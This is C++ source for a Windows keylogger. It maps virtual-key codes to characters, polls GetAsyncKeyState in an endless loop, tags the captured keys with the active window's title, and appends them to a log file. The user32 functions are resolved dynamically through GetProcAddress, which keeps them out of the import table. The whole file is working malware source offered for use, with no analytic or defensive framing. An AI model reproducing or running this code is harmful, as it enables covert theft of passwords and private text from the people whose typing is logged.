#include "KeyLogger.h"


KEYS keys[]={
	{8,"b","b"},
	{13,"e","e"},
	{27,"[ESC]","[ESC]"},
	{112,"[F1]","[F1]"},
	{113,"[F2]","[F2]"},
	{114,"[F3]","[F3]"},
	{115,"[F4]","[F4]"},
	{116,"[F5]","[F5]"},
	{117,"[F6]","[F6]"},
	{118,"[F7]","[F7]"},
	{119,"[F8]","[F8]"},
	{120,"[F9]","[F9]"},
	{121,"[F10]","[F10]"},
	{122,"[F11]","[F11]"},
	{123,"[F12]","[F12]"},
	{192,"`","~"},
	{49,"1","!"},
	{50,"2","@"},
	{51,"3","#"},
	{52,"4","$"},
	{53,"5","%"},
	{54,"6","^"},
	{55,"7","&"},
	{56,"8","*"},
	{57,"9","("},
	{48,"0",")"},
	{189,"-","_"},
	{187,"=","+"},
	{9,"[TAB]","[TAB]"},
	{81,"q","Q"},
	{87,"w","W"},
	{69,"e","E"},
	{82,"r","R"},
	{84,"t","T"},
	{89,"y","Y"},
	{85,"u","U"},
	{73,"i","I"},
	{79,"o","O"},
	{80,"p","P"},
	{219,"[","{"},
	{221,"","}"},
	{65,"a","a"},
	{83,"s","S"},
	{68,"d","D"},
	{70,"f","F"},
	{71,"g","G"},
	{72,"h","H"},
	{74,"j","J"},
	{75,"k","K"},
	{76,"l","L"},
	{186,";",":"},
	{222,"'","\""},
	{90,"z","Z"},
	{88,"x","X"},
	{67,"c","C"},
	{86,"v","V"},
	{66,"b","B"},
	{78,"n","N"},
	{77,"m","M"},
	{188,",","<"},
	{190,".",">"},
	{191,"/",".?"},
	{220,"\\","|"},
	{17,"[CTRL]","[CTRL]"},
	{91,"[WIN]","[WIN]"},
	{32," "," "},
	{92,"[WIN]","[WIN]"},
	{44,"[PRSC]","[PRSC]"},
	{145,"[SCLK]","[SCLK]"},
	{45,"[INS]","[INS]"},
	{36,"[HOME]","[HOME]"},
	{33,"[PGUP]","[PGUP]"},
	{46,"[DEL]","[DEL]"},
	{35,"[END]","[END]"},
	{34,"[PGDN]","[PGDN]"},
	{37,"[LEFT]","[LEFT]"},
	{38,"[UP]","[UP]"},
	{39,"[RGHT]","[RGHT]"},
	{40,"[DOWN]","[DOWN]"},
	{144,"[NMLK]","[NMLK]"},
	{111,"/","/"},
	{106,"*","*"},
	{109,"-","-"},
	{107,"+","+"},
	{96,"0","0"},
	{97,"1","1"},
	{98,"2","2"},
	{99,"3","3"},
	{100,"4","4"},
	{101,"5","5"},
	{102,"6","6"},
	{103,"7","7"},
	{104,"8","8"},
	{105,"9","9"},
	{110,".","."}
};


DWORD __stdcall LoggerThread(LPVOID param){

   Logger log;
   RexString *str = (RexString*)param;
   RexString buff = *str;
   log.run(buff.revToString());

   delete param;

   return 0;
}


bool Logger::saveKeys(char *fileName, char *buffer){

    HANDLE file = openFile(fileName,'a');
    if(file==INVALID_HANDLE_VALUE)
        return false;
    RexString buff = buffer;
    writeFile(file, buff);
    closeFile(file);

    return true;
}

bool Logger::run(char *fileName){




    char windowtxt[255];
    HINSTANCE user32_addr;

    user32_addr = LoadLibrary ("user32.dll");
    if (user32_addr==NULL)
        return false;

    typedef HWND(__stdcall *GFW)(void);
    GFW _GetForegroundWindow;

    typedef int(__stdcall *GWT)(HWND, char*, int);
    GWT _GetWindowText;

    typedef bool(__stdcall *SPI)(int, int, PVOID, int );
    SPI _SystemParametersInfo;

    typedef SHORT(__stdcall *GAKS)(int);
    GAKS _GetAsyncKeyState;

    _GetForegroundWindow        = (GFW) GetProcAddress(user32_addr, "GetForegroundWindow");
    if(!_GetForegroundWindow )
        return false;
    _GetWindowText        = (GWT) GetProcAddress(user32_addr, "GetWindowTextA");
    if(!_GetWindowText )
        return false;
    _SystemParametersInfo        = (SPI) GetProcAddress(user32_addr, "SystemParametersInfoA");
    if(!_SystemParametersInfo  )
        return false;

    _GetAsyncKeyState        = (GAKS) GetProcAddress(user32_addr, "GetAsyncKeyState");
    if(!_GetAsyncKeyState  )
        return false;


    HWND active = _GetForegroundWindow();

	HWND old = active;

	_GetWindowText(old,windowtxt,255);
	int bKstate[256]={0};
	int shift = 0;
    RexString buffer="";
    long key_speed = 0;
    _SystemParametersInfo(10, 0 , &key_speed,0);


    int time = GetTickCount();
	while(1){
        active = _GetForegroundWindow();
		if(active!=old){
		    time = GetTickCount();
		    saveKeys(fileName, buffer.revToString());
            buffer = "";
			old = active;
			_GetWindowText(old,windowtxt,255);

			RexString buff = "\r\nWin: ";
            buff+windowtxt;
            buff+"\r\n";
            saveKeys(fileName, buff.revToString());

		}
        char k[2];
        int i;
        for(i=VK_SPACE; i<=92; i++){

            short hKey = _GetAsyncKeyState(i);
            if(hKey==-32767 || hKey==1){
                time = GetTickCount();
                if(buffer.getSize()>50){
                    char l = tolower(i);
                    buffer+l;
                    saveKeys(fileName,buffer.revToString());
                    buffer = "";
                }
                else{
                    char l = tolower(i);
                    buffer+l;
                }
            }
        }
        if((GetTickCount()-time)>7000){
            if(buffer.getSize()>0)
                saveKeys(fileName,buffer.revToString());
            buffer = "";
            time = GetTickCount();
        }
        Sleep(key_speed+80);
    }

    return true;
}


